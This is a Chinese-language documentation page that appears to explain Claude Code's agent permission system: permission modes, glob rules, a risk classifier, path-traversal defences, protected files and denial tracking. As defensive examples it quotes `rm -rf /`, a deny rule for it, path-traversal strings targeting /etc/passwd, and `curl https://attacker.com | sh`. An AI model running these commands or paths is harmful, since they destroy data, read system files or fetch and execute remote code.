---
title: Permission System
layout: default
nav_order: 6
parent: Agentic Design
---

# Permission 系统：Agent 的沙箱

## 为什么需要权限管控？

想象 Claude 可以执行任意 bash 命令。用户说"帮我看看网站"，Claude 可能：
- 合法地执行 `curl https://example.com`
- 也可能执行 `rm -rf /` ← 灾难

**权限系统的目标**：
1. 阻止意外的危险操作
2. 提示用户"你确定吗？"
3. 在保留便利的同时维护安全

Claude Code 的 permission 系统是一个**五层防线**的多层防御机制。

---

## 核心概念：Permission Mode

系统支持多种权限模式，用户启动时选择（环境变量或配置文件）：

| Mode | 特点 | 场景 | 审批速度 |
|------|------|------|---------|
| `default` | 每次都问用户 | 不信任 agent，想完全控制 | 很慢（用户等待） |
| `auto` | ML 分类器自动审批 | 信任 agent，想要流畅体验 | 快（自动） |
| `acceptEdits` | 自动接受文件编辑（危险操作仍问） | 开发工作流 | 中等 |
| `bypass` | 完全自动，不问 | 内部测试、自动化流程 | 极快 |
| `dontAsk` / `yolo` | 拒绝所有非低风险操作 | 沙箱环境，最安全 | 快（直接拒绝） |

启动方式：
```bash
# 每次都问
claude-code --permission-mode default

# 自动审批（推荐）
claude-code --permission-mode auto

# 最安全
claude-code --permission-mode dontAsk
```

相关文件：`utils/permissions/PermissionMode.ts`

---

## Permission 决策 Pipeline：五层防线

当 agent 试图执行一个 tool 时，系统会问："我应该允许吗？"

```
Agent 调用: BashTool { command: "npm test" }
  │
  ├─ [Layer 1] Mode 检查
  │      if mode == "bypass" → ✓ 允许，直接返回
  │      if mode == "dontAsk" → ✗ 拒绝 unsafe tool，返回
  │
  ├─ [Layer 2] Always Allow / Always Deny 规则
  │      检查用户配置的规则列表
  │      如: "Bash(git *)" → 允许 git 命令
  │         "Bash(npm *)" → 允许 npm 命令
  │      我们的命令 "npm test" 匹配 "npm *" → ✓ 允许
  │
  ├─ [Layer 3] 风险分类
  │      规则匹配 → 风险等级为 LOW
  │      如果没匹配到规则，继续下一层
  │
  ├─ [Layer 4] YOLO 分类器
  │      对于 MEDIUM 风险的操作：
  │      - 如果命令看起来"明显安全"（开发模式），自动批准
  │      - 否则需要用户确认
  │      对于 HIGH 风险的操作：
  │      - 一般不自动允许，转到第 5 层
  │
  └─ [Layer 5] 最后手段：提示用户
         用户选择: ✓ 允许 / ✗ 拒绝 / 📝 改规则
```

相关文件：
- 核心决策逻辑：`utils/permissions/permissions.ts`（52 KB）
- YOLO 分类器：`utils/permissions/yoloClassifier.ts`（52 KB）

---

## 规则系统：Glob 模式

用户可以配置规则，告诉 agent 什么是自动允许的。规则语法使用 **Glob 模式**（不是正则表达式）：

```
Bash(git *)               # 允许任何 git 命令
Bash(npm install)         # 只允许 npm install，不允许 npm test
FileEdit(src/*.ts)        # 允许编辑 src/ 下的 .ts 文件
FileRead(/*)              # 允许读任何文件
BashDeny(rm -rf /*)       # 明确拒绝危险命令
```

### 规则分层（优先级）

规则可以来自多个地方，优先级从**高到低**：

1. **CLI 参数**：`--approve-file "FileEdit(src/*.ts)"`
2. **项目配置**：`.claude/settings.json` 中的 `approvals`
3. **用户设置**：`~/.claude/settings.json`
4. **系统默认**：Claude Code 内置的基础规则

下层规则会被上层规则覆盖。

相关文件：
- `utils/permissions/permissionRuleParser.ts`：规则解析
- `utils/permissions/permissionsLoader.ts`：规则加载

---

## YOLO 分类器：ML 自动审批

对于**规则未覆盖的操作**，系统用 YOLO 分类器（"You Only Live Once"）决定：

```
输入:
  tool_name: "BashTool"
  command: "npm test"
  context: 当前任务是"修复 bug"

分类器评估:
  - 命令类型（npm 相对安全）
  - 模式匹配（test 是常见操作，不是破坏性）
  - 上下文（"修复 bug" 任务中运行 npm test 很合理）

结论: "这个操作很像是开发者会做的正常事，批准"
```

分类器基于启发式规则和一些 ML 训练，考虑：
- **Tool 类型**（BashTool 比 FileReadTool 高风险）
- **具体命令**（`npm test` 比 `rm -rf` 安全）
- **当前上下文**（"修复 bug" vs "浏览网页"）

相关文件：`utils/permissions/yoloClassifier.ts`（52 KB）

### YOLO 的风险等级

```
LOW
  → 自动允许（不问用户）
  → 例：FileReadTool, GlobTool, GrepTool, WebFetchTool
  → 典型：ls, cat, grep

MEDIUM
  → 取决于 mode（auto mode 用分类器，default mode 问用户）
  → 例：FileEditTool, BashTool (git 命令)
  → 典型：npm install, git commit

HIGH
  → 一般不自动允许（需要用户确认）
  → 例：BashTool (rm -rf), PowerShellTool, REPLTool
  → 典型：rm -rf /, curl | bash, eval()
```

---

## 路径安全：防止路径遍历攻击

即使规则写得再好，攻击者也可能用**特殊编码**绕过：

```
规则: FileEdit(src/*.ts)  ← 只允许 src/ 目录

攻击尝试:
  path: "src/../../../etc/passwd"              ← 目录遍历
  path: "src%2f..%2f..%2fetc%2fpasswd"        ← URL 编码
  path: "src/\u202e../../../etc/passwd"       ← Unicode 隐藏字符
```

系统有多层防御：

### 1. Path Normalization（路径规范化）

```
"src/../../../etc/passwd"
  ↓ 规范化
"/etc/passwd"
  ↓ 检查是否在 src/ 内?
否 → 拒绝
```

### 2. URL Decoding（URL 解码）

```
"src%2f..%2f..%2fetc"
  ↓ 解码
"src/../../etc"
  ↓ 规范化
"/etc"
  ↓ 拒绝
```

### 3. Unicode Normalization（Unicode 规范化）

```
隐藏字符被检测和清理
```

相关文件：`utils/permissions/pathValidation.ts`（62 KB）

---

## Protected Files：敏感文件黑名单

某些文件**永远不会被自动编辑**，即使通过了所有权限检查：

```
.gitconfig              ← Git 配置，修改可能破坏工作流
.bashrc, .zshrc         ← Shell 配置，修改可能卡住终端
.claude/settings.json   ← Claude Code 自己的配置
.mcp.json               ← MCP 配置，影响工具可用性
.env, .env.local        ← 环境变量，可能含密钥
```

这些文件即使通过了权限检查，也会再次提示用户确认。

---

## Denial Tracking：Circuit Breaker 机制

如果用户连续拒绝 agent 多次，system 会自动**降级权限模式**：

```
用户拒绝:
  1. "BashTool"       ← Denial #1
  2. "FileEditTool"   ← Denial #2
  3. "BashTool"       ← Denial #3

连续 3 次拒绝触发!
  ↓
系统自动切换到 "default" mode
后续所有操作都要问用户
  ↓
这样防止：
  - Agent 持续尝试被拒的操作
  - 用户一直看到提示烦不胜烦
```

同时，系统还追踪**总拒绝数**：

```
同一 session 中总共拒绝了 20 次
  ↓
系统记录日志："这个 session 决策质量差，建议用户审视任务"
  ↓
可能是：
  - Agent 理解错了用户需求
  - Agent 太激进
  - 权限规则配置不当
```

相关文件：`utils/permissions/denialTracking.ts`

---

## Permission Explainer：可解释的决策

一个 LLM 驱动的工具为用户生成**人类可读的解释**：

```
系统拒绝了: BashTool { command: "curl https://attacker.com | sh" }

解释:
"这个命令试图从互联网上下载并执行代码。这是一个
高风险操作，容易被中间人攻击。除非你完全信任
attacker.com，否则不建议执行。"

用户现在可以：
✓ 执行（我知道风险）
✗ 拒绝（取消操作）
📝 修改命令（例如改为先 curl 到文件再审查）
```

---

## Sandbox Adapter：隔离执行环境

对于操作**风险较高但必要**的情况，系统可以：
- 将执行重定向到**受限环境**（Docker 容器、沙箱）
- 防止主机系统被破坏
- 同时允许 agent 功能继续

```
用户说："我需要测试一个未知的脚本"
  ↓
Agent 请求执行 script.sh
  ↓
权限检查：这个脚本未验证，HIGH 风险
  ↓
系统说："我可以在沙箱中运行这个"
  ↓
在容器内执行 script.sh
  ↓
如果脚本做坏事（删文件、改配置），只影响沙箱
  ↓
Agent 看到执行结果，继续下一步
```

---

## Bypass Mode：内部和特殊环境

一个 `isBypassPermissionsModeAvailable` flag 允许特殊环境（CI/CD、内部测试）在没有交互提示的情况下运行，同时维护审计日志：

```
环境: CI/CD pipeline
  ↓
Agent 执行大量 tool（构建、测试、部署）
  ↓
所有操作自动进行（没有用户提示）
  ↓
但所有操作都被记录到 audit log
  ↓
运维人员可以后审（如果出问题，追踪是哪步）
```

---

## Design Decision 专栏

### 为什么需要 ML 分类器？

如果只用规则：
```
允许所有 Bash 命令?
  → 太宽，不安全（用户可能 rm -rf）

只允许 git/npm 命令?
  → 太窄，不便利（sudo docker pull 被拒）
```

ML 分类器的优势：
```
可以说"这个命令看起来是在开发工作流的一部分，
而不是破坏性操作，所以允许"

如果出错（分类有假阴性）：
  系统还有：
  - Denial tracking（连续拒绝降级）
  - Protected files（黑名单）
  - Circuit breaker（防反复）
```

所以 ML 不是唯一防线，而是**多层防御中的一层**。

### 为什么规则支持 Glob 而不是正则表达式？

**Glob**：`src/*.ts` → 简单直观
**正则**：`^src/[^/]+\.ts$` → 复杂，容易写错

目标用户是**工程师，但不是安全专家**。Glob 的错误率更低，而且 CLI 工具（如 .gitignore）已经用 Glob，学习曲线平缓。

---

## 常见误解

**误解 1**："Permission mode 是全局的，改一次就生效？"

实际：可以在 CLI 参数中针对单个命令覆盖：
```bash
# 这个 /commit 用 auto mode
claude-code --permission-mode auto /commit

# 这个 /config 用 default mode
claude-code --permission-mode default /config
```

**误解 2**："YOLO 分类器是完美的？"

实际：分类器是 **best-effort**，有假阳性和假阴性。
- 假阴性（该拒的通过了）会被 denial tracking 捕捉到
- 假阳性（该通过的拒了）用户可以手动审批或改规则

**误解 3**："Protected files 名单是硬编码的？"

实际：可以通过配置扩展：
```json
{
  "protectedFiles": [".gitconfig", ".bashrc", ".my-precious-file"]
}
```

**误解 4**："权限检查会很慢？"

实际：
- Layer 1-3（mode、规则、分类）都是 O(1) 或 O(n) 快速操作
- YOLO 分类器是专门优化的轻量级模型
- 权限检查通常 <10ms

---

## 关键要点

1. **五层防线**：Mode → Rules → Risk Classification → YOLO → User Prompt
2. **Permission mode**：`default`（每次问）、`auto`（ML 自动）、`bypass`（完全自动）、`dontAsk`（最安全）
3. **规则系统**：Glob 模式，分层来源（CLI > project > user > default）
4. **YOLO 分类器**：ML 自动批准 MEDIUM 风险操作，不需要用户每次确认
5. **Denial tracking**：连续 3 次拒绝自动降级权限，防止烦人的重复提示
6. **路径安全**：多层防御（normalization、URL decode、Unicode clean）
7. **Protected files**：黑名单，永远要再次确认
8. **Sandbox adapter**：高风险操作可以隔离执行

---

## 深入阅读

- `utils/permissions/permissions.ts`：完整决策逻辑（52 KB）
- `utils/permissions/yoloClassifier.ts`：YOLO 分类器实现（52 KB）
- `utils/permissions/pathValidation.ts`：路径安全（62 KB）
- `utils/permissions/denialTracking.ts`：Denial tracking 逻辑
- `utils/permissions/PermissionMode.ts`：Mode 定义

下一步：了解**Context 和 Memory 系统**，看看当 context window 快满时会发生什么。
